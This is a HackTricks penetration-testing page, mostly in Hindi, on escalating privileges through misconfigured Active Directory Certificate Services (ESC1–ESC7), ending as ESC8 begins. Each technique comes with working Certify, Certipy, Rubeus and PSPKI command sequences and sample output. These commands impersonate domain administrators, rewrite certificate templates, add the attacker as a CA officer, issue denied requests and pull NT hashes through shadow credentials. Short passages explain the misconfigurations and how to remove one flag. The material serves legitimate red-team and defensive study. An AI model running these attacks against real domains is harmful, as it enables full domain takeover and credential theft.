# AD CS Domain Escalation

{{#include ../../../banners/hacktricks-training.md}}


**यह पोस्ट्स के एस्कलेशन तकनीक अनुभागों का सारांश है:**

- [https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)
- [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)

## Misconfigured Certificate Templates - ESC1

### व्याख्या

### Misconfigured Certificate Templates - ESC1 की व्याख्या

- **एंटरप्राइज़ CA द्वारा कम-प्रिविलेज्ड उपयोगकर्ताओं को एनरोलमेंट अधिकार दिए जाते हैं।**
- **मैनेजर अनुमोदन आवश्यक नहीं है।**
- **अधिकृत कर्मियों के हस्ताक्षर आवश्यक नहीं हैं।**
- **सर्टिफिकेट टेम्पलेट्स पर सुरक्षा वर्णनकर्ता अत्यधिक उदार हैं, जिससे कम-प्रिविलेज्ड उपयोगकर्ता एनरोलमेंट अधिकार प्राप्त कर सकते हैं।**
- **सर्टिफिकेट टेम्पलेट्स को ऐसे EKU परिभाषित करने के लिए कॉन्फ़िगर किया गया है जो authentication को सक्षम करते हैं:**
- Extended Key Usage (EKU) पहचानकर्ता जैसे Client Authentication (OID 1.3.6.1.5.5.7.3.2), PKINIT Client Authentication (1.3.6.1.5.2.3.4), Smart Card Logon (OID 1.3.6.1.4.1.311.20.2.2), Any Purpose (OID 2.5.29.37.0), या कोई EKU नहीं (SubCA) शामिल हैं।
- **Certificate templates द्वारा requesters को Certificate Signing Request (CSR) में subjectAltName शामिल करने की अनुमति दी जाती है:**
- यदि उपस्थित हो तो Active Directory (AD) प्रमाण-पत्र में identity verification के लिए subjectAltName (SAN) को प्राथमिकता देता है। इसका मतलब है कि CSR में SAN निर्दिष्ट करके, किसी भी उपयोगकर्ता (उदा., एक domain administrator) के रूप में impersonate करने के लिए एक सर्टिफिकेट अनुरोध किया जा सकता है। यह कि requester द्वारा SAN निर्दिष्ट किया जा सकता है या नहीं, यह certificate template के AD ऑब्जेक्ट में `mspki-certificate-name-flag` property के माध्यम से संकेतित होता है। यह property एक bitmask है, और `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag की उपस्थिति requester को SAN निर्दिष्ट करने की अनुमति देती है।

> [!CAUTION]
> उक्त कॉन्फ़िगरेशन कम-प्रिविलेज्ड उपयोगकर्ताओं को किसी भी चुनी हुई SAN के साथ सर्टिफिकेट अनुरोध करने की अनुमति देता है, जिससे Kerberos या SChannel के माध्यम से किसी भी domain principal के रूप में authentication सक्षम हो जाता है।

यह फीचर कभी-कभी उत्पादों या तैनाती सेवाओं द्वारा HTTPS या host certificates को ऑन-द-फ्लाई जनरेट करने का समर्थन करने के लिए या समझ की कमी के कारण सक्षम किया जाता है।

यह ध्यान दिया गया है कि इस विकल्प के साथ एक सर्टिफिकेट बनाते समय एक चेतावनी उत्पन्न होती है, जो उस स्थिति में नहीं होती जब किसी मौजूदा सर्टिफिकेट टेम्पलेट (जैसे `WebServer` टेम्पलेट, जिसमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` सक्षम है) को डुप्लीकेट कर के और फिर उसे authentication OID शामिल करने के लिए संशोधित किया जाए।

### दुरुपयोग

कमज़ोर सर्टिफिकेट टेम्पलेट खोजने के लिए आप चला सकते हैं:
```bash
Certify.exe find /vulnerable
certipy find -username john@corp.local -password Passw0rd -dc-ip 172.16.126.128
```
इस **vulnerability का दुरुपयोग करके एक administrator के रूप में impersonate** करने के लिए आप निम्न चला सकते हैं:
```bash
# Impersonate by setting SAN to a target principal (UPN or sAMAccountName)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator@corp.local

# Optionally pin the target's SID into the request (post-2022 SID mapping aware)
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator /sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Some CAs accept an otherName/URL SAN attribute carrying the SID value as well
Certify.exe request /ca:dc.domain.local-DC-CA /template:VulnTemplate /altname:administrator \
/url:tag:microsoft.com,2022-09-14:sid:S-1-5-21-1111111111-2222222222-3333333333-500

# Certipy equivalent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' \
-template 'ESC1' -upn 'administrator@corp.local'
```
फिर आप जनरेट किए गए **सर्टिफिकेट को `.pfx`** फ़ॉर्मैट में बदलकर और फिर से **Rubeus या certipy का उपयोग करके प्रमाणीकरण कर सकते हैं:**
```bash
Rubeus.exe asktgt /user:localdomain /certificate:localadmin.pfx /password:password123! /ptt
certipy auth -pfx 'administrator.pfx' -username 'administrator' -domain 'corp.local' -dc-ip 172.16.19.100
```
Windows बाइनरीज़ "Certreq.exe" और "Certutil.exe" का उपयोग PFX जनरेट करने के लिए किया जा सकता है: https://gist.github.com/b4cktr4ck2/95a9b908e57460d9958e8238f85ef8ee

AD Forest के configuration schema में certificate templates का enumeration किया जा सकता है — विशेष रूप से वे जो अनुमोदन या signatures की आवश्यकता नहीं रखते, जिनमें Client Authentication या Smart Card Logon EKU हो, और जिनमें `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` flag enabled हो — निम्न LDAP query चलाकर:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=1.3.6.1.4.1.311.20.2.2)(pkiextendedkeyusage=1.3.6.1.5.5.7.3.2)(pkiextendedkeyusage=1.3.6.1.5.2.3.4)(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*)))(mspkicertificate-name-flag:1.2.840.113556.1.4.804:=1))
```
## गलत कॉन्फ़िगर किए गए प्रमाणपत्र टेम्पलेट - ESC2

### व्याख्या

दूसरा दुरुपयोग परिदृश्य पहले वाले का एक रूपांतर है:

1. Enrollment rights Enterprise CA द्वारा कम-प्राधिकार वाले उपयोगकर्ताओं को दिए गए हैं।
2. manager approval की आवश्यकता disabled कर दी गई है।
3. authorized signatures की आवश्यकता को हटा दिया गया है।
4. certificate template पर अत्यधिक permissive security descriptor कम-प्राधिकार वाले उपयोगकर्ताओं को certificate enrollment rights देता है।
5. **The certificate template is defined to include the Any Purpose EKU or no EKU.**

**Any Purpose EKU** एक attacker को **any purpose** के लिए प्रमाणपत्र प्राप्त करने की अनुमति देता है, जैसे client authentication, server authentication, code signing, आदि। इस परिदृश्य का शोषण करने के लिए वही **technique used for ESC3** उपयोग की जा सकती है।

**no EKUs** वाले प्रमाणपत्र, जो subordinate CA प्रमाणपत्र के रूप में कार्य करते हैं, को **any purpose** के लिए और **नए प्रमाणपत्रों पर भी हस्ताक्षर करने के लिए** शोषित किया जा सकता है। इसलिए, एक attacker subordinate CA प्रमाणपत्र का उपयोग करके नए प्रमाणपत्रों में arbitrary EKUs या फील्ड निर्दिष्ट कर सकता है।

हालाँकि, यदि subordinate CA को **`NTAuthCertificates`** ऑब्जेक्ट द्वारा भरोसा नहीं दिया गया है (जो कि डिफ़ॉल्ट सेटिंग है), तो **domain authentication** के लिए बनाए गए नए प्रमाणपत्र काम नहीं करेंगे। फिर भी, एक attacker अभी भी **any EKU** और arbitrary प्रमाणपत्र मानों के साथ **नए प्रमाणपत्र** बना सकता है। इन्हें संभावित रूप से कई उद्देश्यों (उदा., code signing, server authentication, आदि) के लिए **abused** किया जा सकता है और नेटवर्क में अन्य ऐप्लिकेशनों जैसे SAML, AD FS, या IPSec पर महत्वपूर्ण प्रभाव पड़ सकता है।

AD Forest के configuration schema में इस परिदृश्य से मेल खाने वाले टेम्पलेट्स को सूचीबद्ध करने के लिए, निम्न LDAP query चलायी जा सकती है:
```
(&(objectclass=pkicertificatetemplate)(!(mspki-enrollmentflag:1.2.840.113556.1.4.804:=2))(|(mspki-ra-signature=0)(!(mspki-rasignature=*)))(|(pkiextendedkeyusage=2.5.29.37.0)(!(pkiextendedkeyusage=*))))
```
## Misconfigured Enrolment Agent Templates - ESC3

### स्पष्टीकरण

यह परिदृश्य पहले और दूसरे परिदृश्य जैसा है लेकिन **abusing** a **different EKU** (Certificate Request Agent) और **2 different templates** (इसलिए इसके पास 2 सेट आवश्यकताएँ हैं),

The **Certificate Request Agent EKU** (OID 1.3.6.1.4.1.311.20.2.1), जिसे Microsoft दस्तावेज़ में **Enrollment Agent** कहा जाता है, एक principal को अनुमति देता है कि वह किसी अन्य उपयोगकर्ता की **behalf of another user** पर **enroll** के लिए **certificate** प्राप्त करे।

The **“enrollment agent”** ऐसे **template** में enroll करता है और resulting **certificate** का उपयोग करके दूसरे उपयोगकर्ता की ओर से एक **CSR** को co-sign करता है। फिर वह co-signed CSR को **CA** को भेजता है, इस प्रकार उस **template** में enroll होता है जो **“enroll on behalf of”** की अनुमति देता है, और **CA** उत्तर में उस “other” user के लिए एक **certificate** प्रदान करता है।

**Requirements 1:**

- Enrollment rights Enterprise CA द्वारा कम-विशेषाधिकार वाले उपयोगकर्ताओं को दिए गए हैं।
- Manager approval की आवश्यकता हटाई गई है।
- Authorized signatures की कोई आवश्यकता नहीं है।
- certificate template का security descriptor अत्यधिक permissive है, और यह enrollment rights कम-विशेषाधिकार वाले उपयोगकर्ताओं को प्रदान करता है।
- certificate template में Certificate Request Agent EKU शामिल है, जो अन्य principals की ओर से अन्य certificate templates का अनुरोध करने में सक्षम बनाता है।

**Requirements 2:**

- Enterprise CA कम-विशेषाधिकार वाले उपयोगकर्ताओं को enrollment rights प्रदान करता है।
- Manager approval को bypass किया गया है।
- टेम्पलेट का schema version या तो 1 है या 2 से अधिक है, और यह एक Application Policy Issuance Requirement निर्दिष्ट करता है जो Certificate Request Agent EKU की आवश्यकता करता है।
- certificate template में परिभाषित एक EKU domain authentication की अनुमति देता है।
- Enrollment agents के लिए restrictions CA पर लागू नहीं किए गए हैं।

### दुरुपयोग

आप इस परिदृश्य का दुरुपयोग करने के लिए [**Certify**](https://github.com/GhostPack/Certify) या [**Certipy**](https://github.com/ly4k/Certipy) का उपयोग कर सकते हैं:
```bash
# Request an enrollment agent certificate
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:Vuln-EnrollmentAgent
certipy req -username john@corp.local -password Passw0rd! -target-ip ca.corp.local' -ca 'corp-CA' -template 'templateName'

# Enrollment agent certificate to issue a certificate request on behalf of
# another user to a template that allow for domain authentication
Certify.exe request /ca:DC01.DOMAIN.LOCAL\DOMAIN-CA /template:User /onbehalfof:CORP\itadmin /enrollment:enrollmentcert.pfx /enrollcertpwd:asdf
certipy req -username john@corp.local -password Pass0rd! -target-ip ca.corp.local -ca 'corp-CA' -template 'User' -on-behalf-of 'corp\administrator' -pfx 'john.pfx'

# Use Rubeus with the certificate to authenticate as the other user
Rubeu.exe asktgt /user:CORP\itadmin /certificate:itadminenrollment.pfx /password:asdf
```
The **उपयोगकर्ता** जिन्हें **enrollment agent certificate** **प्राप्त** करने की अनुमति है, जिन टेम्प्लेट्स में enrollment **agents** को enroll करने की अनुमति है, और जिन **accounts** की ओर से enrollment agent कार्य कर सकता है, उन्हें enterprise CAs द्वारा प्रतिबंधित किया जा सकता है। यह `certsrc.msc` **snap-in** खोलकर, **CA पर राइट‑क्लिक** करके, **Properties** पर क्लिक करके, और फिर “Enrollment Agents” टैब पर **नेविगेट** करके किया जाता है।

हालाँकि, ध्यान देने योग्य है कि CAs के लिए **default** सेटिंग “**Do not restrict enrollment agents**” होती है। जब administrators द्वारा enrollment agents पर प्रतिबंध सक्षम किया जाता है, यानी इसे “Restrict enrollment agents” पर सेट किया जाता है, तब भी default कॉन्फ़िगरेशन बेहद उदार बनी रहती है। यह **Everyone** को किसी भी टेम्पलेट में किसी भी व्यक्ति के रूप में enroll करने की पहुँच देती है।

## Vulnerable Certificate Template Access Control - ESC4

### **व्याख्या**

**certificate templates** पर मौजूद **security descriptor** उस टेम्पलेट के संदर्भ में विशिष्ट **AD principals** के पास मौजूद **permissions** को परिभाषित करता है।

यदि किसी **हमलावर** के पास किसी **template** को **alter** करने और पिछले सेक्शन्स में वर्णित किसी भी **शोषण योग्य गलत कॉन्फ़िगरेशन** को लागू करने के लिए आवश्यक **permissions** मौजूद हों, तो privilege escalation संभव हो सकती है।

certificate templates पर लागू कुछ प्रमुख permissions में शामिल हैं:

- **Owner:** ऑब्जेक्ट पर निहित नियंत्रण प्रदान करता है, जिससे किसी भी attributes को संशोधित करने की अनुमति मिलती है।
- **FullControl:** ऑब्जेक्ट पर पूर्ण अधिकार प्रदान करता है, जिसमें किसी भी attributes को बदलने की क्षमता शामिल है।
- **WriteOwner:** ऑब्जेक्ट के owner को हमलावर के नियंत्रण में किसी principal पर बदलने की अनुमति देता है।
- **WriteDacl:** access controls को समायोजित करने की अनुमति देता है, जिससे संभावित रूप से हमलावर को FullControl दिया जा सकता है।
- **WriteProperty:** किसी भी ऑब्जेक्ट properties को संपादित करने का अधिकार देता है।

### **दुरुपयोग**

templates और अन्य PKI objects पर edit अधिकार वाले principals की पहचान करने के लिए, Certify के साथ enumerate करें:
```bash
Certify.exe find /showAllPermissions
Certify.exe pkiobjects /domain:corp.local /showAdmins
```
An example of a privesc like the previous one:

<figure><img src="../../../images/image (814).png" alt=""><figcaption></figcaption></figure>

ESC4 उस स्थिति को कहते हैं जब किसी user के पास किसी certificate template पर write privileges होते हैं। उदाहरण के तौर पर इसे abuse करके certificate template की configuration को overwrite किया जा सकता है ताकि template ESC1 के लिए vulnerable बन जाए।

As we can see in the path above, only `JOHNPC` has these privileges, but our user `JOHN` has the new `AddKeyCredentialLink` edge to `JOHNPC`. Since this technique is related to certificates, I have implemented this attack as well, which is known as [Shadow Credentials](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab). Here’s a little sneak peak of Certipy’s `shadow auto` command to retrieve the NT hash of the victim.
```bash
certipy shadow auto 'corp.local/john:Passw0rd!@dc.corp.local' -account 'johnpc'
```
**Certipy** एक ही कमांड से certificate template की configuration को ओवरराइट कर सकता है। **डिफ़ॉल्ट रूप से**, Certipy configuration को **ओवरराइट** कर देगा ताकि वह **ESC1 के लिए असुरक्षित** हो जाए। हम भी **`-save-old` parameter पुरानी configuration बचाने के लिए** निर्दिष्ट कर सकते हैं, जो हमारे हमले के बाद configuration को **पुनर्स्थापित** करने में उपयोगी होगा।
```bash
# Make template vuln to ESC1
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -save-old

# Exploit ESC1
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template ESC4-Test -upn administrator@corp.local

# Restore config
certipy template -username john@corp.local -password Passw0rd -template ESC4-Test -configuration ESC4-Test.json
```
## कमजोर PKI ऑब्जेक्ट एक्सेस कंट्रोल - ESC5

### व्याख्या

ACL-आधारित परस्पर जुड़ी हुई रिश्तों का विस्तृत जाल, जिसमें certificate templates और certificate authority से परे कई objects शामिल हैं, पूरे AD CS सिस्टम की सुरक्षा को प्रभावित कर सकता है। ये objects, जो सुरक्षा पर महत्वपूर्ण प्रभाव डाल सकते हैं, शामिल हैं:

- CA सर्वर का AD computer object, जिसे S4U2Self या S4U2Proxy जैसे मैकेनिज़्म के माध्यम से समझौता किया जा सकता है।
- CA सर्वर का RPC/DCOM server।
- किसी भी descendant AD object या container जो विशेष container path `CN=Public Key Services,CN=Services,CN=Configuration,DC=<DOMAIN>,DC=<COM>` के भीतर हो। यह path, पर सीमित नहीं होकर, ऐसे containers और objects को शामिल करता है जैसे Certificate Templates container, Certification Authorities container, the NTAuthCertificates object, और Enrollment Services Container।

यदि एक low-privileged attacker इन किसी भी महत्वपूर्ण घटकों पर नियंत्रण हासिल कर लेता है, तो PKI सिस्टम की सुरक्षा समझौता हो सकती है।

## EDITF_ATTRIBUTESUBJECTALTNAME2 - ESC6

### व्याख्या

[**CQure Academy post**](https://cqureacademy.com/blog/enhanced-key-usage) में चर्चित विषय Microsoft द्वारा बताई गई बातों के अनुसार **`EDITF_ATTRIBUTESUBJECTALTNAME2`** फ्लैग के प्रभावों को भी छूता है। यह कॉन्फ़िगरेशन, जब एक Certification Authority (CA) पर सक्रिय किया जाता है, तो किसी भी request के लिए, उन अनुरोधों सहित जो Active Directory® से बनाए गए हैं, **user-defined values** को **subject alternative name** में शामिल करने की अनुमति देता है। परिणामस्वरूप, यह प्रावधान एक **आक्रमणकर्ता** को domain **authentication** के लिए सेट की गई किसी भी template के माध्यम से enroll करने की अनुमति दे सकता है—विशेष रूप से उन templates के लिए जो unprivileged user enrollment के लिए खुले हों, जैसे standard User template। इसके नतीजेस्वरूप, एक certificate हासिल किया जा सकता है, जिससे आक्रमणकर्ता domain administrator या domain के किसी भी अन्य सक्रिय entity के रूप में authenticate कर सकता है।

**Note**: Certificate Signing Request (CSR) में **alternative names** जोड़ने का तरीका, `certreq.exe` में `-attrib "SAN:"` argument के माध्यम से (जिसे “Name Value Pairs” कहा जाता है), ESC1 में SANs के exploitation strategy से अलग है। यहाँ अंतर इस बात में है कि account information कैसे encapsulated है—एक certificate attribute के अंदर, न कि एक extension में।

### दुरुपयोग

सत्यापित करने के लिए कि यह setting सक्रिय है या नहीं, संगठन निम्नलिखित command को `certutil.exe` के साथ उपयोग कर सकते हैं:
```bash
certutil -config "CA_HOST\CA_NAME" -getreg "policy\EditFlags"
```
यह ऑपरेशन मूलतः **remote registry access** का उपयोग करता है, इसलिए एक वैकल्पिक तरीका हो सकता है:
```bash
reg.exe query \\<CA_SERVER>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA_NAME>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\ /v EditFlags
```
जैसे टूल्स [**Certify**](https://github.com/GhostPack/Certify) और [**Certipy**](https://github.com/ly4k/Certipy) इस गलत विन्यास का पता लगाने और इसका शोषण करने में सक्षम हैं:
```bash
# Detect vulnerabilities, including this one
Certify.exe find

# Exploit vulnerability
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:User /altname:localadmin
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User -upn administrator@corp.local
```
इन सेटिंग्स को बदलने के लिए, यदि किसी के पास **domain administrative** अधिकार या समकक्ष हों, तो निम्नलिखित कमांड किसी भी workstation से चलाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2
```
अपने पर्यावरण में इस कॉन्फ़िगरेशन को अक्षम करने के लिए, flag को हटाया जा सकता है:
```bash
certutil -config "CA_HOST\CA_NAME" -setreg policy\EditFlags -EDITF_ATTRIBUTESUBJECTALTNAME2
```
> [!WARNING]
> May 2022 सुरक्षा अपडेट्स के बाद, नव-इश्यू किए गए **certificates** में एक **security extension** शामिल होगा जो अनुरोधकर्ता के **`objectSid` property** को समाहित करता है। ESC1 के लिए, यह SID निर्दिष्ट SAN से व्युत्पन्न होता है। हालांकि, ESC6 के लिए, SID अनुरोधकर्ता के **`objectSid`** को परिलक्षित करता है, SAN को नहीं।\
> ESC6 का लाभ उठाने के लिए, सिस्टम का ESC10 (Weak Certificate Mappings) के प्रति संवेदनशील होना आवश्यक है, जो नई security extension की तुलना में **SAN को प्राथमिकता देता है**।

## कमजोर Certificate Authority Access Control - ESC7

### हमला 1

#### स्पष्टीकरण

Certificate authority के लिए access control उन permissions के सेट के माध्यम से बनाए रखा जाता है जो CA क्रियाओं को नियंत्रित करते हैं। इन permissions को `certsrv.msc` खोलकर, किसी CA पर right-click करके, Properties चुनकर और फिर Security tab पर जाकर देखा जा सकता है। इसके अलावा, permissions को PSPKI module का उपयोग करके निम्नलिखित commands के साथ enumerate किया जा सकता है:
```bash
Get-CertificationAuthority -ComputerName dc.domain.local | Get-CertificationAuthorityAcl | select -expand Access
```
यह मुख्य अधिकारों, अर्थात् **`ManageCA`** और **`ManageCertificates`**, के बारे में अंतर्दृष्टि प्रदान करता है, जो क्रमशः “CA administrator” और “Certificate Manager” भूमिकाओं से मेल खाते हैं।

#### दुरुपयोग

किसी certificate authority पर **`ManageCA`** अधिकार होना principal को PSPKI का उपयोग करके रिमोट रूप से सेटिंग्स बदलने में सक्षम बनाता है। इसमें किसी भी टेम्पलेट में SAN निर्दिष्ट करने की अनुमति देने के लिए **`EDITF_ATTRIBUTESUBJECTALTNAME2`** फ्लैग को टॉगल करना शामिल है, जो domain escalation का एक महत्वपूर्ण पहलू है।

यह प्रक्रिया PSPKI के **Enable-PolicyModuleFlag** cmdlet के उपयोग से सरल की जा सकती है, जिससे सीधे GUI इंटरैक्शन के बिना संशोधन संभव होते हैं।

**`ManageCertificates`** अधिकार होने से लंबित अनुरोधों की स्वीकृति में सुविधा होती है, जो प्रभावी रूप से "CA certificate manager approval" safeguard को बाईपास कर देता है।

**Certify** और **PSPKI** मॉड्यूल के संयोजन का उपयोग certificate को request, approve, और download करने के लिए किया जा सकता है:
```bash
# Request a certificate that will require an approval
Certify.exe request /ca:dc.domain.local\theshire-DC-CA /template:ApprovalNeeded
[...]
[*] CA Response      : The certificate is still pending.
[*] Request ID       : 336
[...]

# Use PSPKI module to approve the request
Import-Module PSPKI
Get-CertificationAuthority -ComputerName dc.domain.local | Get-PendingRequest -RequestID 336 | Approve-CertificateRequest

# Download the certificate
Certify.exe download /ca:dc.domain.local\theshire-DC-CA /id:336
```
### हमला 2

#### व्याख्या

> [!WARNING]
> पिछले **हमले** में **`Manage CA`** permissions का उपयोग **EDITF_ATTRIBUTESUBJECTALTNAME2** flag को **सक्षम** करने के लिए किया गया था ताकि **ESC6 attack** को अंजाम दिया जा सके, लेकिन इसका कोई प्रभाव तब तक नहीं होगा जब तक कि CA सेवा (`CertSvc`) को पुनरारंभ नहीं किया जाता। जब किसी उपयोगकर्ता के पास `Manage CA` access right होता है, तो उस उपयोगकर्ता को सेवा को **पुनरारंभ** करने की अनुमति भी होती है। हालांकि, इसका यह मतलब नहीं है कि उपयोगकर्ता दूर से सेवा को पुनरारंभ कर सकता है। इसके अलावा, E**SC6 might not work out of the box** in most patched environments due to the May 2022 security updates.

इसलिए, यहाँ एक और हमला प्रस्तुत किया जा रहा है।

पूर्वापेक्षाएँ:

- केवल **`ManageCA` अनुमति**
- **`Manage Certificates`** अनुमति (को **`ManageCA`** से प्रदान किया जा सकता है)
- Certificate टेम्पलेट **`SubCA`** को **सक्षम** होना चाहिए (इसे **`ManageCA`** से सक्षम किया जा सकता है)

यह तकनीक इस तथ्य पर निर्भर करती है कि जिन उपयोगकर्ताओं के पास `Manage CA` _और_ `Manage Certificates` access right हैं, वे **failed certificate requests जारी** कर सकते हैं। **`SubCA`** certificate template **ESC1 के लिए कमजोर** है, लेकिन **केवल administrators** ही टेम्पलेट में नामांकन कर सकते हैं। इसलिए, एक **user** **`SubCA`** में नामांकन करने का **अनुरोध** कर सकता है - जिसे **अस्वीकृत** कर दिया जाएगा - पर बाद में उसे मैनेजर द्वारा **जारी** किया जा सकता है।

#### दुरुपयोग

आप अपने आप को **`Manage Certificates` एक्सेस अधिकार प्रदान कर सकते हैं** अपने उपयोगकर्ता को एक नया अधिकारी बनाकर जोड़कर।
```bash
certipy ca -ca 'corp-DC-CA' -add-officer john -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'John' on 'corp-DC-CA'
```
**`SubCA`** टेम्पलेट को `-enable-template` पैरामीटर के साथ **CA पर सक्षम किया जा सकता है**। डिफ़ॉल्ट रूप से, `SubCA` टेम्पलेट सक्षम है।
```bash
# List templates
certipy ca -username john@corp.local -password Passw0rd! -target-ip ca.corp.local -ca 'corp-CA' -enable-template 'SubCA'
## If SubCA is not there, you need to enable it

# Enable SubCA
certipy ca -ca 'corp-DC-CA' -enable-template SubCA -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'corp-DC-CA'
```
यदि हमने इस हमले के लिए आवश्यक शर्तें पूरी कर ली हैं, तो हम **`SubCA` टेम्पलेट पर आधारित एक सर्टिफिकेट का अनुरोध करके शुरू कर सकते हैं**।

**यह अनुरोध अस्वीकार कर दिया जाएगा**, लेकिन हम private key को सहेजेंगे और request ID नोट कर लेंगे।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template SubCA -upn administrator@corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 785
Would you like to save the private key? (y/N) y
[*] Saved private key to 785.key
[-] Failed to request certificate
```
हमारे पास **`Manage CA` और `Manage Certificates`** होने पर, हम `ca` कमांड और `-issue-request <request ID>` पैरामीटर का उपयोग करके असफल प्रमाणपत्र अनुरोध **जारी कर सकते हैं**।
```bash
certipy ca -ca 'corp-DC-CA' -issue-request 785 -username john@corp.local -password Passw0rd
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```
और अंत में, हम `req` कमांड और `-retrieve <request ID>` पैरामीटर के साथ **जारी किया गया सर्टिफिकेट प्राप्त कर सकते हैं**।
```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
### Attack 3 – Manage Certificates Extension Abuse (SetExtension)

#### स्पष्टीकरण

क्लासिक ESC7 दुरुपयोगों (EDITF attributes को सक्षम करना या pending requests को अनुमोदित करना) के अलावा, **Certify 2.0** ने एक ब्रांड-नया primitive उजागर किया जो केवल Enterprise CA पर *Manage Certificates* (a.k.a. **Certificate Manager / Officer**) भूमिका की आवश्यकता रखता है।

`ICertAdmin::SetExtension` RPC मेथड को कोई भी प्रधान जो *Manage Certificates* रखता है चला सकता है। जबकि यह मेथड पारंपरिक रूप से वैध CAs द्वारा **pending** requests पर एक्सटेंशन्स को अपडेट करने के लिए उपयोग किया जाता था, एक attacker इसे दुरुपयोग कर सकता है ताकि वह किसी approval की प्रतीक्षा कर रहे request में एक *non-default* certificate extension (उदाहरण के लिए एक custom *Certificate Issuance Policy* OID जैसे `1.1.1.1`) जोड़ दे।

क्योंकि लक्षित template उस extension के लिए **default value** निर्धारित नहीं करता, CA attacker-नियंत्रित मान को request के eventual issuance के समय overwrite नहीं करेगा। नतीजतन जारी किया गया certificate attacker-चुना हुआ extension रखेगा जो कि:

* अन्य कमजोर templates की Application / Issuance Policy आवश्यकताओं को पूरा कर सकता है (जिससे privilege escalation हो सकता है)।
* अतिरिक्त EKUs या policies इंजेक्ट कर सकता है जो third-party systems में certificate को अनपेक्षित ट्रस्ट दे दें।

संक्षेप में, *Manage Certificates* — जिसे पहले ESC7 के “कम शक्तिशाली” आधे के रूप में माना जाता था — अब बिना CA configuration को छुए या अधिक प्रतिबंधित *Manage CA* अधिकार की आवश्यकता के, पूर्ण privilege escalation या long-term persistence के लिए इस्तेमाल किया जा सकता है।

#### Abusing the primitive with Certify 2.0

1. **ऐसा certificate request सबमिट करें जो *pending* ही रहे।** इसे ऐसे template के साथ जबरन बनाया जा सकता है जिसे manager approval की आवश्यकता हो:
```powershell
Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
# Take note of the returned Request ID
```

2. **pending request में एक custom extension जोड़ें** नए `manage-ca` कमांड का उपयोग करके:
```powershell
Certify.exe manage-ca --ca SERVER\\CA-NAME \
--request-id 1337 \
--set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
```
*यदि template पहले से *Certificate Issuance Policies* extension को परिभाषित नहीं करता है, तो ऊपर दिया गया मान issuance के बाद संरक्षित रहेगा।*

3. **request जारी करें** (यदि आपकी भूमिका के पास *Manage Certificates* approval अधिकार भी हैं) या किसी operator के approval का इंतज़ार करें। जारी हो जाने पर, certificate डाउनलोड करें:
```powershell
Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
```

4. परिणामी certificate में अब malicious issuance-policy OID होगा और इसे बाद के हमलों (जैसे ESC13, domain escalation, आदि) में उपयोग किया जा सकता है।

> नोट: वही attack Certipy ≥ 4.7 के साथ भी `ca` कमांड और `-set-extension` पैरामीटर के माध्यम से निष्पादित किया जा सकता है।

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### स्पष्टीकरण

> [!TIP]
> उन वातावरणों में जहाँ **AD CS इंस्टॉल** है, यदि कोई **web enrollment endpoint vulnerable** मौजूद है और कम से कम एक **certificate template प्रकाशित** है जो **domain computer enrollment and client authentication** की अनुमति देता है (जैसे default **`Machine`** template), तो यह संभव हो जाता है कि **spooler service सक्रिय किसी भी कंप्यूटर को attacker द्वारा compromised किया जा सके**!

